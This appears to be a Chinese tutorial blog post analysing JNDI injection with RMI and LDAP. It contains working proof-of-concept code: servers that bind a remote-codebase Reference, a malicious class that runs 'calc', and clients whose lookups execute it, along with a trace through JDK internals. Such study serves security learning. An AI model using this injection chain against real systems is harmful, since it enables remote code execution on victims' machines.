<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>

<h2 id="Xddo5">JNDI简单利用</h2>
实现JDNI，我们首先也要把RMIServer启动起来

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后续将JNDIRMIServer也启动起来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>());</span><br><span class="line"><span class="comment">//        Reference refObj = new Reference(&quot;TestRef&quot;,&quot;TestRef&quot;,&quot;http://localhost:7777/&quot;);</span></span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;,refObj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过客户端的远程调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="gQnyu">分析</h3>
我们不能像RMI之前那样来调用了，但调用的方式其实差不多

<p>首先要做的是创建一个<strong>初始化上下文</strong></p>
<p>然后再去寻找，我们需要把协议地址传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们想，他这里会不会是调用的原生rmi的方法，我们跟进去看一下</p>
<p>最后走到了<code>RegistryContext#lookup</code>的方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到，调用的是<code>RegistryImpl_Stub</code>的lookup方法</p>
<p>那我们就能知道了，实际这里调用的就是rmi原生的lookup方法</p>
<p>如果说服务端lookup中的参数可控的话，我们就可以用它来查询我们构造的恶意对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736589928418-eeea02a8-f39b-47f5-b206-255ddc93955e.png"></p>
<h2 id="HIr5E">JNDI结合RMI</h2>
<h3 id="xGqJQ">引用对象</h3>
在目录存储对象中支持以下几种对象

<ul>
<li>java可序列化对象</li>
<li>引用对象</li>
<li>属性对象</li>
<li>远程对象</li>
<li>CORBA对象</li>
</ul>
<p>平时我们所说的JNDI所指的是<strong>引用对象</strong></p>
<p>我们先来看看，引用对象创建的几个参数</p>
<p>第一个是类名，第二个是工厂名，第三个是工厂的位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(className);</span><br><span class="line">        classFactory = factory;</span><br><span class="line">        classFactoryLocation = factoryLocation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="leUiH">实现</h3>
来看一下它的实现，创建一个引用对象，将TestRef类和TestRef工厂绑定到`http://localhost:7777`下面，再将**引用对象**绑定到`rmi://localhost:1099/remoteObj`中

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,new RemoteObjImpl());</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们这里构造一个恶意类，写入可以弹出计算器的恶意代码</p>
<p>编译好后放在一个文件夹下，开启一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736592223285-925e1da9-5d1e-4723-8b64-f446cfd067ae.png"></p>
<p>然后用JNDI客户端去调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终成功弹出计算机</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736597825736-6b8ac8f4-9a3b-4adb-9ffc-934b1f8fab53.png"></p>
<h4 id="DDBMN">小tip</h4>
由于调用恶意类的构造函数实在客户端（被攻击端）上执行，所以在编译时候，恶意类的开头不可以带`package`，否则会报出`NoClassDefFoundError`错误。

<h3 id="Oa7Ym">流程分析</h3>
其中具体的流程我们也来跟一下

<p>刚才我们也说了，实际它是调用rmi原生的lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从lookup方法得到对象后，发现是一个<code>ReferenceWrapper_Stub</code>对象，而我们实际绑定的是<code>Reference</code>对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736598520877-027f3360-b23b-4d9a-9c53-456461c74054.png"></p>
<p>绑定的是<code>Reference</code>而查看的时候是<code>ReferenceWrapper_Stub</code>，那问题肯定出在rebind方法上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>走入函数里看一下，在调用<code>RegistryImpl_Stub</code>的<code>rebind</code>方法时候，名字还是我们传入的名字，而传入的方法是经过了<code>encodeObject</code>之后的对象，也就是对对象进行了一层封装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rebind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidNameException</span>(<span class="string">&quot;RegistryContext: Cannot rebind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.registry.rebind(var1.get(<span class="number">0</span>), <span class="built_in">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var4).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看一下<code>encodeObject</code>函数的逻辑</p>
<p>如果该对象是一个<code>Reference</code>对象的话，那么就封装进<code>ReferenceWrapper</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Remote <span class="title function_">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们看一下客户端<code>lookup</code>的逻辑</p>
<p>在<code>RegistryContext</code>的<code>lookup</code>方法中，我们看到了调用rmi原生<code>lookup</code>的地方，将找到的对象存入var2中（<code>ReferenceWrapper_Stub</code>）</p>
<p>在该方法的最后，我们可以看到想对应的<code>decodeObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里这个方法就是将接受到的<code>ReferenceWrapper_Stub</code>对象，变为我们开始创建的<code>Reference</code>对象</p>
<p>我们快走出<code>RegistryContext</code>类了，但是还是没有对恶意类进行初始化，也就是说，类加载机制是<strong>和容器协议无关</strong>的</p>
<p>return时会走入<code>NamingManager</code>的<code>getObjectInstance</code>方法内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看到<code>NamingManager#getObjectInstance</code>，其中有个<code>getObjectFactoryFromReference</code>方法是比较重要的，从名字可以看出来，从引用中得到工厂对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从该方法中可以找进行<strong>工厂类的类加载</strong>位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入loadClass方法，首先使用的类加载器是<code>AppClassLoader</code>，在本地去寻找，但是本地是肯定找不到的，再近一步</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; loadClass(String className, ClassLoader cl)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className, <span class="literal">true</span>, cl);</span><br><span class="line">        <span class="keyword">return</span> cls;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>没找到的话，会从codebase中寻找，找到的话，就会用codebase去进行类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里新建了一个URLClassLoader，将codebase传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在return中的<code>loadClass</code>中，会去cl中的url路径下找类，然后进行加载</p>
<p>同时这个加载也是进行初始化的加载，若我的恶意代码写在静态代码块的地方，现在计算机已经弹出来了，但是我们的恶意代写在的是构造函数中，必须需要实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; loadClass(String className, ClassLoader cl)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className, <span class="literal">true</span>, cl);</span><br><span class="line">        <span class="keyword">return</span> cls;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736600826484-ccf9d3e1-7991-44cc-a742-cb748f91b72a.png"></p>
<p>而实例化刚好在<code>getObjectFactoryFromReference</code>之中，实例化后就执行了恶意的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="xqvll">总结</h3>
这里存在两个攻击面：

<ol>
<li>rmi原生问题（这里就没有演示了）</li>
<li>jndi注入</li>
</ol>
<h2 id="eFuEZ">JNDI结合LDAP</h2>
LDAP不是java的东西，而是一个通用协议

<p>在jdk8u121后，修复了RMI和COBAR的攻击点，唯独漏下一个LDAP（8u191），所以我们接下来看一下</p>
<h3 id="HCpu2">实现</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>, refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用<font style="color:rgb(51, 51, 51);">apache Directory Studio来创建一个LDAP服务</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736740682898-bf498bf2-8737-4f3c-9296-80dcb0faa229.png"></p>
<p>启动起来**（这里搞了好久，最后更换jdk11才成功启动）**</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742486383-3e11b932-8373-41ff-b681-b1858ecf1ec6.png"></p>
<p>我们这里可以看到，已经成功绑定上去了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742565713-b5089d07-f12d-4552-a977-958653a3a708.png"></p>
<p>然后我们创建一个客户端，使用lookup方法去查找一下（还和之前一样，在TestRef.class的位置开启一个http服务）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将LDAP客户端运行起来，就成功弹出了计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742972042-dcf6e9a9-ed0f-4e5d-a175-2454b7d0a6a1.png"></p>
<h3 id="vVqbv">分析</h3>
